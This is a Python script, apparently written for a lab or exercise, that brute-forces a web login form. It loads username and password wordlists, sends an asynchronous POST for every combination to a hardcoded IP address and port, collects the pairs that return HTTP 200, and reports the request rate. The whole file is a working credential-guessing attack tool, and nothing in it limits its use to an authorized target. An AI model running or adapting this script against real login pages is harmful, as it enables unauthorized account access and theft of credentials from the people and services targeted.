import time
import itertools
import asyncio
import aiohttp

#lists
username_list = []
password_list = []
credentials = []

#Rate Limit 
#Pause between Requests 
PbR = 1/10

async def bruteforce(session,user1,pass1):
    myURL = 'http://54.206.178.157:8084/classified.html'
    head= {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {'username': (user1), 'password': (pass1)}
    #sends the post request 
    async with session.post(myURL, headers=head, data=payload) as resp:
        if resp.status == 200:
            #if we find a valid credential, we append to our credentials list
            a = 'Username:%s    Password:%s' %(user1,pass1)
            credentials.append(a)
        #if we have invalid requests, will print out the invalid credentials 
        elif resp.status == 401:
            print('Invalid Credentials! Username: %s    Password: %s' % (user1,pass1))
        #if we get neither a 201 or 400 response, print the status code and quit
        else:
            print('Error code! %d' % (resp.status))
            quit()

async def main():
    #when making several requests to the same host, the TCP connection will be reused which result in faster responses
    async with aiohttp.ClientSession() as session:
        tasks = []
        #used the itertools library to get all permutations of username and password
        for r in itertools.product(username_list, password_list):
            #r[0] is the username in username_list, r[1] is the password in password_list
            user1 = r[0]
            pass1 = r[1]
            #appends all the POST requests using the bruteforce fucnction into the tasks list consisting of futures for each request
            tasks.append(asyncio.ensure_future(bruteforce(session,user1,pass1)))
            #implements pause between requests
            await asyncio.sleep(PbR)
        #unpacks the list which runs the POST requests all at once 
        await asyncio.gather(*tasks)
    #finds the amount of requests sent divided by the time taken to POST all requests to find requests per second
    rpmS = (len(tasks)//(time.time()-start_time))
    print('<---------You have sent %d requests per second-----_---->' %(rpmS)) 
 
if __name__ == "__main__":
    #records the time the script is started 
    start_time = time.time()
    #asks user input for name of username and password file 
    usernme = str(input('Enter username file: '))
    passwd = str(input('Enter password file: '))
    try:
    #encoding in utf-8 prevents encoding issues that may arise from certain password lists 
        usernames = open(usernme, 'r', encoding='utf-8') 
        passwords = open(passwd, 'r', encoding='utf-8') 
    #if FileNotFoundError is invoked, it will quit the script
    except FileNotFoundError:
        print('File(s) cannot be found!') 
        quit()
    #if both files are found, it will make a list for the usernames and passwords 
    else: 
        for username in usernames:
            username_list.extend(map(str,username.rstrip().split(','))) 
        for password in passwords:
            password_list.extend(map(str,password.rstrip().split(',')))
    #runs the main function asynchronusly 
    asyncio.run(main())
    print('  <----------------Credentials Found----------------->')
    #at the end, it prints out all the valid credentials 
    print(*credentials, sep='\n')
    #records the current time after all functions are executed against the initial time recorded when the script was started
    print("--- %.4f seconds ---" % (time.time() - start_time))
    